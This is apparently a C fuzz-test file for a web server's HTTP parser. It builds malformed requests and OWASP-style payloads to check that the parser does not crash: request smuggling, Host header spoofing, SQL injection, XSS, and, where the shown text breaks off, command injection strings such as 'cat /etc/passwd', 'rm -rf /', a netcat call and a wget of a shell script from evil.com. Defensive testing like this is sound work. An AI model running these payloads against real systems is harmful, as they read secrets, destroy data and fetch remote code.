#include "framework.h"
#include "httprequestparser.h"
#include "httpparsercommon.h"
#include "httprequest.h"
#include "connection_s.h"
#include "appconfig.h"
#include "cqueue.h"
#include "str.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

// ============================================================================
// Mock Configuration and Dependencies
// ============================================================================

extern appconfig_t* appconfig(void);
extern env_t* env(void);

// Mock server and domain structures
static domain_t mock_domain = {
    .pcre_erroffset = 0,
    .template = "localhost",
    .prepared_template = NULL,
    .pcre_error = NULL,
    .pcre_template = NULL,
    .next = NULL
};

static server_t mock_server = {
    .ip = 0x0100007F,  // 127.0.0.1
    .port = 8080,
    .domain = &mock_domain,
    .http = {.route = NULL, .ratelimiter = NULL, .redirect = NULL, .middleware = NULL},
    .websockets = {.route = NULL, .ratelimiter = NULL, .default_handler = NULL, .middleware = NULL},
    .next = NULL
};

// ============================================================================
// Helper Functions for Smart Fuzzing
// ============================================================================

// Simple PRNG for deterministic fuzzing
static unsigned int fuzz_seed = 0;

static void fuzz_seed_init(unsigned int seed) {
    fuzz_seed = seed;
}

__attribute__((unused))
static unsigned int fuzz_rand(void) {
    fuzz_seed = fuzz_seed * 1103515245 + 12345;
    return (fuzz_seed / 65536) % 32768;
}

// Helper macro for appending strings to str_t
#define sb_append(sb, str) str_append((sb), (str), strlen(str))

// Mock listener and queue
__attribute__((unused))
static cqueue_item_t mock_queue_item = {
    .data = &mock_server,
    .next = NULL
};

static listener_t mock_listener = {
    .servers = {.item = NULL, .last_item = NULL, .size = 0, .locked = 0},
    .connection = NULL,
    .api = NULL,
    .next = NULL
};

// Mock server context
static connection_server_ctx_t mock_server_ctx = {
    .listener = &mock_listener,
    .parser = NULL,
    .server = NULL,
    .response = NULL,
    .queue = NULL,
    .broadcast_queue = NULL
};

// Setup parser with fuzzing data
static httprequestparser_t* setup_parser_with_data(const char* data, size_t data_len) {
    connection_t* conn = calloc(1, sizeof(connection_t));
    if (!conn) return NULL;

    conn->buffer = calloc(1, data_len + 1);
    if (!conn->buffer) {
        free(conn);
        return NULL;
    }

    memcpy(conn->buffer, data, data_len);
    conn->buffer_size = data_len;
    conn->ip = 0x0100007F;  // 127.0.0.1
    conn->port = 8080;
    conn->ssl = NULL;
    conn->ctx = (connection_ctx_t*)&mock_server_ctx;
    conn->keepalive = 0;

    httprequestparser_t* parser = httpparser_create(conn);
    if (!parser) {
        free(conn->buffer);
        free(conn);
        return NULL;
    }

    httpparser_set_bytes_readed(parser, data_len);
    return parser;
}

// Cleanup parser and connection
static void cleanup_parser(httprequestparser_t* parser) {
    if (!parser) return;

    connection_t* conn = parser->connection;
    httpparser_free(parser);

    if (conn) {
        if (conn->buffer) free(conn->buffer);
        free(conn);
    }
}

// ============================================================================
// Smart Fuzzing Tests - HTTP-Aware Mutations
// ============================================================================

TEST(test_smart_fuzzing_malformed_methods) {
    TEST_SUITE("HTTP Parser Smart Fuzzing");
    TEST_CASE("Malformed HTTP methods");

    fuzz_seed_init(11111);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    // Test variations of methods
    const char* method_mutations[] = {
        "GET",
        "POST",
        "PUT",
        "DELETE",
        "HEAD",
        "OPTIONS",
        "PATCH",
        "get",           // lowercase
        "Get",           // mixed case
        "GE",            // truncated
        "GETX",          // extra char
        "G E T",         // spaces
        "GET\x00",       // null byte
        "GET\xFF",       // high byte
        "XXXXXXXXXX",    // long invalid
        "",              // empty
        " GET",          // leading space
        "GET ",          // trailing space (valid but unusual)
        "\rGET",         // leading CR
        "\nGET",         // leading LF
    };

    for (size_t i = 0; i < sizeof(method_mutations) / sizeof(method_mutations[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        str_append(sb, method_mutations[i], strlen(method_mutations[i]));
        sb_append(sb, " /index.html HTTP/1.1\r\nHost: localhost\r\n\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on malformed methods");
}

TEST(test_smart_fuzzing_malformed_uris) {
    TEST_SUITE("HTTP Parser Smart Fuzzing");
    TEST_CASE("Malformed URIs");

    fuzz_seed_init(22222);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* uri_mutations[] = {
        "/",
        "/index.html",
        "",                                  // empty
        "/ ",                               // trailing space
        " /",                               // leading space
        "//",                               // double slash
        "/../",                             // directory traversal
        "/./",                              // current directory
        "/index.html?",                     // empty query
        "/index.html?a=b&c=d",             // query string
        "/index.html#fragment",             // fragment
        "/index.html?a=b#frag",            // query + fragment
        "http://example.com/",             // absolute URL
        "/index.html\x00test",             // null byte
        "/",                                // just slash repeated
        "/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", // long path
        "/\xFF\xFE\xFD",                   // high bytes
        "/%00",                             // percent-encoded null
        "/%2F",                             // percent-encoded slash
        "/index%",                          // incomplete percent encoding
        "/index%0",                         // incomplete percent encoding
        "/index%GG",                        // invalid percent encoding
        "/index.html\r\n",                 // embedded CRLF
        "/index.html\n",                   // embedded LF
        "/\r\n/index.html",                // CRLF in middle
    };

    for (size_t i = 0; i < sizeof(uri_mutations) / sizeof(uri_mutations[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "GET ");
        sb_append(sb, uri_mutations[i]);
        sb_append(sb, " HTTP/1.1\r\nHost: localhost\r\n\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on malformed URIs");
}

TEST(test_smart_fuzzing_malformed_protocols) {
    TEST_SUITE("HTTP Parser Smart Fuzzing");
    TEST_CASE("Malformed HTTP protocol versions");

    fuzz_seed_init(33333);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* protocol_mutations[] = {
        "HTTP/1.1",
        "HTTP/1.0",
        "HTTP/2.0",
        "HTTP/1.2",
        "http/1.1",      // lowercase
        "HTTP/1",        // missing minor
        "HTTP/",         // missing version
        "HTTP",          // missing slash
        "HTTP/1.1.1",    // extra version
        "HTTP/1.1 ",     // trailing space
        " HTTP/1.1",     // leading space
        "HTTP/1.1\x00",  // null byte
        "HTTP/1.1\r\n",  // embedded CRLF
        "HTTPS/1.1",     // wrong protocol name
        "FTP/1.1",       // wrong protocol
        "",              // empty
        "HTTP/a.b",      // non-numeric
        "HTTP/999.999",  // large version
    };

    for (size_t i = 0; i < sizeof(protocol_mutations) / sizeof(protocol_mutations[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "GET /index.html ");
        sb_append(sb, protocol_mutations[i]);
        sb_append(sb, "\r\nHost: localhost\r\n\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on malformed protocols");
}

TEST(test_smart_fuzzing_malformed_headers) {
    TEST_SUITE("HTTP Parser Smart Fuzzing");
    TEST_CASE("Malformed HTTP headers");

    fuzz_seed_init(44444);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    // Test various header malformations
    const char* header_mutations[] = {
        "Host: localhost",
        "Host:localhost",                   // no space after colon
        "Host : localhost",                 // space before colon
        "Host  :  localhost",               // multiple spaces
        "Host:",                            // no value
        ": localhost",                      // no key
        "Host",                             // no colon
        "Host: localhost\r\nHost: example.com",  // duplicate host
        "Content-Length: 100",
        "Content-Length: -1",               // negative
        "Content-Length: abc",              // non-numeric
        "Content-Length: 99999999999999999999",  // huge number
        "Content-Length: 0",
        "Content-Length: ",                 // empty value
        "Transfer-Encoding: chunked",
        "X-Custom-Header: value",
        "X-Very-Long-Header-Name-That-Goes-On-And-On: value",
        "X-Header: " "very long value that keeps going on and on and on",
        "X-Header: \x00",                   // null byte in value
        "X-Header: \xFF\xFE",               // high bytes in value
        "X\x00Header: value",               // null in key
        "X-Header\r\n: value",              // CRLF in key
        "X-Header: val\r\nue",              // CRLF in value
        "X-Header\xFF: value",              // high byte in key
    };

    for (size_t i = 0; i < sizeof(header_mutations) / sizeof(header_mutations[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "GET /index.html HTTP/1.1\r\n");
        sb_append(sb, header_mutations[i]);
        sb_append(sb, "\r\n\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on malformed headers");
}

TEST(test_smart_fuzzing_line_ending_variations) {
    TEST_SUITE("HTTP Parser Smart Fuzzing");
    TEST_CASE("Line ending variations");

    fuzz_seed_init(55555);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    // Test different line ending combinations
    const char* line_endings[] = {
        "\r\n",      // standard
        "\n",        // LF only
        "\r",        // CR only
        "\n\r",      // reversed
        "\r\r\n",    // extra CR
        "\r\n\r\n",  // double CRLF
        "\n\n",      // double LF
        "\r\r",      // double CR
    };

    for (size_t i = 0; i < sizeof(line_endings) / sizeof(line_endings[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "GET /index.html HTTP/1.1");
        sb_append(sb, line_endings[i]);
        sb_append(sb, "Host: localhost");
        sb_append(sb, line_endings[i]);
        sb_append(sb, line_endings[i]);

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on line ending variations");
}

TEST(test_smart_fuzzing_header_flooding) {
    TEST_SUITE("HTTP Parser Smart Fuzzing");
    TEST_CASE("Header flooding attack");

    fuzz_seed_init(66666);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    // Try to flood with many headers
    for (int count = 1; count <= 200; count += 20) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "GET /index.html HTTP/1.1\r\n");
        sb_append(sb, "Host: localhost\r\n");

        for (int i = 0; i < count; i++) {
            char header[64];
            snprintf(header, sizeof(header), "X-Header-%d: value-%d\r\n", i, i);
            sb_append(sb, header);
        }
        sb_append(sb, "\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on header flooding");
}

TEST(test_smart_fuzzing_large_header_values) {
    TEST_SUITE("HTTP Parser Smart Fuzzing");
    TEST_CASE("Large header values");

    fuzz_seed_init(77777);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    size_t sizes[] = {100, 1000, 8000, 16000, 32000, 64000};

    for (size_t i = 0; i < sizeof(sizes) / sizeof(sizes[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "GET /index.html HTTP/1.1\r\n");
        sb_append(sb, "Host: localhost\r\n");
        sb_append(sb, "X-Large-Header: ");

        // Add large value
        char* large_value = malloc(sizes[i] + 1);
        if (large_value) {
            memset(large_value, 'A', sizes[i]);
            large_value[sizes[i]] = '\0';
            sb_append(sb, large_value);
            free(large_value);
        }

        sb_append(sb, "\r\n\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on large header values");
}

TEST(test_smart_fuzzing_content_length_mismatch) {
    TEST_SUITE("HTTP Parser Smart Fuzzing");
    TEST_CASE("Content-Length mismatch attacks");

    fuzz_seed_init(88888);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    // Test Content-Length that doesn't match actual payload
    struct {
        const char* content_length;
        const char* body;
    } test_cases[] = {
        {"10", "short"},                    // CL > actual
        {"5", "This is longer"},           // CL < actual
        {"0", "Has body anyway"},          // CL=0 but has body
        {"100", ""},                        // CL>0 but no body
        {"4294967295", "test"},            // max uint32
        {"18446744073709551615", "test"},  // max uint64
    };

    for (size_t i = 0; i < sizeof(test_cases) / sizeof(test_cases[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "POST /upload HTTP/1.1\r\n");
        sb_append(sb, "Host: localhost\r\n");
        sb_append(sb, "Content-Length: ");
        sb_append(sb, test_cases[i].content_length);
        sb_append(sb, "\r\n\r\n");
        sb_append(sb, test_cases[i].body);

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on Content-Length mismatches");
}

TEST(test_smart_fuzzing_special_characters_in_headers) {
    TEST_SUITE("HTTP Parser Smart Fuzzing");
    TEST_CASE("Special characters in headers");

    fuzz_seed_init(99999);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* special_chars[] = {
        "\x00", "\x01", "\x02", "\x1F",  // control chars
        "\x7F", "\x80", "\xFF",          // high chars
        "<", ">", "&", "\"", "'",        // HTML chars
        "\\", "/", "|",                  // path chars
        "\r", "\n", "\r\n",              // line endings
        ";", ":", ",",                   // delimiters
        "$()", "`", "$",                 // shell chars
        "../", "./", "//",               // path traversal
    };

    for (size_t i = 0; i < sizeof(special_chars) / sizeof(special_chars[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "GET /index.html HTTP/1.1\r\n");
        sb_append(sb, "Host: localhost\r\n");
        sb_append(sb, "X-Special: ");
        sb_append(sb, special_chars[i]);
        sb_append(sb, "\r\n\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on special characters");
}

TEST(test_smart_fuzzing_incomplete_requests) {
    TEST_SUITE("HTTP Parser Smart Fuzzing");
    TEST_CASE("Incomplete HTTP requests");

    fuzz_seed_init(12321);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* incomplete_requests[] = {
        "GET",
        "GET ",
        "GET /",
        "GET /index.html",
        "GET /index.html ",
        "GET /index.html HTTP",
        "GET /index.html HTTP/",
        "GET /index.html HTTP/1",
        "GET /index.html HTTP/1.",
        "GET /index.html HTTP/1.1",
        "GET /index.html HTTP/1.1\r",
        "GET /index.html HTTP/1.1\r\n",
        "GET /index.html HTTP/1.1\r\nHost",
        "GET /index.html HTTP/1.1\r\nHost:",
        "GET /index.html HTTP/1.1\r\nHost: ",
        "GET /index.html HTTP/1.1\r\nHost: localhost",
        "GET /index.html HTTP/1.1\r\nHost: localhost\r",
        "GET /index.html HTTP/1.1\r\nHost: localhost\r\n",
    };

    for (size_t i = 0; i < sizeof(incomplete_requests) / sizeof(incomplete_requests[0]); i++) {
        httprequestparser_t* parser = setup_parser_with_data(
            incomplete_requests[i],
            strlen(incomplete_requests[i])
        );
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on incomplete requests");
}

TEST(test_smart_fuzzing_whitespace_variations) {
    TEST_SUITE("HTTP Parser Smart Fuzzing");
    TEST_CASE("Whitespace variations in request line");

    fuzz_seed_init(23432);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* whitespace_mutations[] = {
        "GET /index.html HTTP/1.1",          // standard single space
        "GET  /index.html  HTTP/1.1",        // double spaces
        "GET   /index.html   HTTP/1.1",      // triple spaces
        "GET\t/index.html\tHTTP/1.1",        // tabs
        "GET \t /index.html \t HTTP/1.1",    // mixed spaces and tabs
        " GET /index.html HTTP/1.1",         // leading space
        "GET /index.html HTTP/1.1 ",         // trailing space
        "  GET  /index.html  HTTP/1.1  ",    // multiple everywhere
    };

    for (size_t i = 0; i < sizeof(whitespace_mutations) / sizeof(whitespace_mutations[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, whitespace_mutations[i]);
        sb_append(sb, "\r\nHost: localhost\r\n\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on whitespace variations");
}

// ============================================================================
// OWASP-Based Smart Fuzzing Tests
// ============================================================================

TEST(test_smart_fuzzing_request_smuggling_te_cl) {
    TEST_SUITE("HTTP Parser Smart Fuzzing - OWASP");
    TEST_CASE("Request smuggling: Transfer-Encoding vs Content-Length");

    fuzz_seed_init(34543);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    // Test conflicting Transfer-Encoding and Content-Length headers
    const char* smuggling_attempts[] = {
        // Both headers present (conflict)
        "POST / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n\r\n",

        // Multiple Transfer-Encoding headers
        "POST / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: identity\r\n"
        "\r\n"
        "0\r\n\r\n",

        // Obfuscated Transfer-Encoding
        "POST / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Transfer-Encoding: xchunked\r\n"
        "Content-Length: 10\r\n"
        "\r\n",

        // Transfer-Encoding with spaces
        "POST / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Transfer-Encoding:  chunked  \r\n"
        "\r\n",

        // Transfer-Encoding with tab
        "POST / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Transfer-Encoding:\tchunked\r\n"
        "\r\n",

        // Multiple Content-Length headers (different values)
        "POST / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Content-Length: 5\r\n"
        "Content-Length: 10\r\n"
        "\r\n",
    };

    for (size_t i = 0; i < sizeof(smuggling_attempts) / sizeof(smuggling_attempts[0]); i++) {
        httprequestparser_t* parser = setup_parser_with_data(
            smuggling_attempts[i],
            strlen(smuggling_attempts[i])
        );
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on request smuggling attempts");
}

TEST(test_smart_fuzzing_host_header_attacks) {
    TEST_SUITE("HTTP Parser Smart Fuzzing - OWASP");
    TEST_CASE("Host header attacks");

    fuzz_seed_init(45654);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* host_attacks[] = {
        // Missing Host header (HTTP/1.1 requires it)
        "GET / HTTP/1.1\r\n\r\n",

        // Duplicate Host headers
        "GET / HTTP/1.1\r\n"
        "Host: victim.com\r\n"
        "Host: attacker.com\r\n"
        "\r\n",

        // Host with arbitrary port
        "GET / HTTP/1.1\r\n"
        "Host: localhost:99999\r\n"
        "\r\n",

        // Host with multiple colons
        "GET / HTTP/1.1\r\n"
        "Host: localhost:8080:9090\r\n"
        "\r\n",

        // Host with special characters
        "GET / HTTP/1.1\r\n"
        "Host: evil.com\r\nX-Injected: header\r\n"
        "\r\n",

        // Host with null byte
        "GET / HTTP/1.1\r\n"
        "Host: localhost\x00evil.com\r\n"
        "\r\n",

        // Host with absolute URL (ambiguity)
        "GET http://victim.com/ HTTP/1.1\r\n"
        "Host: attacker.com\r\n"
        "\r\n",

        // Empty Host
        "GET / HTTP/1.1\r\n"
        "Host: \r\n"
        "\r\n",

        // Host with spaces
        "GET / HTTP/1.1\r\n"
        "Host: local host\r\n"
        "\r\n",

        // Host with @
        "GET / HTTP/1.1\r\n"
        "Host: attacker@victim.com\r\n"
        "\r\n",
    };

    for (size_t i = 0; i < sizeof(host_attacks) / sizeof(host_attacks[0]); i++) {
        httprequestparser_t* parser = setup_parser_with_data(
            host_attacks[i],
            strlen(host_attacks[i])
        );
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on Host header attacks");
}

TEST(test_smart_fuzzing_http_verb_tampering) {
    TEST_SUITE("HTTP Parser Smart Fuzzing - OWASP");
    TEST_CASE("HTTP verb tampering");

    fuzz_seed_init(56765);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* verb_attacks[] = {
        // Non-standard but valid methods
        "TRACE / HTTP/1.1\r\nHost: localhost\r\n\r\n",
        "CONNECT localhost:443 HTTP/1.1\r\nHost: localhost\r\n\r\n",
        "PROPFIND / HTTP/1.1\r\nHost: localhost\r\n\r\n",
        "PROPPATCH / HTTP/1.1\r\nHost: localhost\r\n\r\n",
        "MKCOL / HTTP/1.1\r\nHost: localhost\r\n\r\n",
        "COPY / HTTP/1.1\r\nHost: localhost\r\n\r\n",
        "MOVE / HTTP/1.1\r\nHost: localhost\r\n\r\n",
        "LOCK / HTTP/1.1\r\nHost: localhost\r\n\r\n",
        "UNLOCK / HTTP/1.1\r\nHost: localhost\r\n\r\n",

        // Custom/invalid methods
        "HACK / HTTP/1.1\r\nHost: localhost\r\n\r\n",
        "ADMIN / HTTP/1.1\r\nHost: localhost\r\n\r\n",
        "DEBUG / HTTP/1.1\r\nHost: localhost\r\n\r\n",
        "XXXX / HTTP/1.1\r\nHost: localhost\r\n\r\n",

        // Very long method names
        "GETGETGETGETGETGETGETGETGETGETGETGETGET / HTTP/1.1\r\nHost: localhost\r\n\r\n",

        // Method override via header
        "POST / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-HTTP-Method-Override: DELETE\r\n"
        "\r\n",

        "POST / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-HTTP-Method: PUT\r\n"
        "\r\n",

        "POST / HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "X-Method-Override: PATCH\r\n"
        "\r\n",
    };

    for (size_t i = 0; i < sizeof(verb_attacks) / sizeof(verb_attacks[0]); i++) {
        httprequestparser_t* parser = setup_parser_with_data(
            verb_attacks[i],
            strlen(verb_attacks[i])
        );
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on HTTP verb tampering");
}

TEST(test_smart_fuzzing_sql_injection_patterns) {
    TEST_SUITE("HTTP Parser Smart Fuzzing - OWASP");
    TEST_CASE("SQL injection patterns in URI and headers");

    fuzz_seed_init(67876);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* sql_patterns[] = {
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users--",
        "admin'--",
        "' UNION SELECT NULL--",
        "1' AND '1'='1",
        "' OR 'x'='x",
        "'; EXEC xp_cmdshell('dir')--",
        "' OR 1=1#",
        "\\' OR \\'1\\'=\\'1",
    };

    for (size_t i = 0; i < sizeof(sql_patterns) / sizeof(sql_patterns[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        // Test in URI
        sb_append(sb, "GET /user?id=");
        sb_append(sb, sql_patterns[i]);
        sb_append(sb, " HTTP/1.1\r\nHost: localhost\r\n\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);

        // Test in header
        sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "GET / HTTP/1.1\r\nHost: localhost\r\nX-User-Id: ");
        sb_append(sb, sql_patterns[i]);
        sb_append(sb, "\r\n\r\n");

        parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on SQL injection patterns");
}

TEST(test_smart_fuzzing_xss_patterns) {
    TEST_SUITE("HTTP Parser Smart Fuzzing - OWASP");
    TEST_CASE("XSS patterns in URI and headers");

    fuzz_seed_init(78987);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* xss_patterns[] = {
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "\"><script>alert(String.fromCharCode(88,83,83))</script>",
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
    };

    for (size_t i = 0; i < sizeof(xss_patterns) / sizeof(xss_patterns[0]); i++) {
        str_t* sb = str_create_empty(1024);
        if (!sb) continue;

        // Test in URI
        sb_append(sb, "GET /search?q=");
        sb_append(sb, xss_patterns[i]);
        sb_append(sb, " HTTP/1.1\r\nHost: localhost\r\n\r\n");

        httprequestparser_t* parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);

        // Test in Referer header
        sb = str_create_empty(1024);
        if (!sb) continue;

        sb_append(sb, "GET / HTTP/1.1\r\nHost: localhost\r\nReferer: ");
        sb_append(sb, xss_patterns[i]);
        sb_append(sb, "\r\n\r\n");

        parser = setup_parser_with_data(str_get(sb), str_size(sb));
        if (parser) {
            int result = httpparser_run(parser);
            // Fatal errors indicate parser crash/internal failure
            if (result == HTTP1PARSER_ERROR || result == HTTP1PARSER_OUT_OF_MEMORY) {
                crashes++;
            }
            cleanup_parser(parser);
        }

        str_free(sb);
    }

    TEST_ASSERT_EQUAL(0, crashes, "Parser should not crash on XSS patterns");
}

TEST(test_smart_fuzzing_command_injection_patterns) {
    TEST_SUITE("HTTP Parser Smart Fuzzing - OWASP");
    TEST_CASE("Command injection patterns");

    fuzz_seed_init(89098);
    int crashes = 0;  // Count fatal parser errors (ERROR, OUT_OF_MEMORY)

    const char* cmd_patterns[] = {
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "|| echo vulnerable",
        "`id`",
        "$(uname -a)",
        "; rm -rf /",
        "| nc attacker.com 1234",
        "&& curl evil.com",
        "; wget http://evil.com/shell.sh",
    };

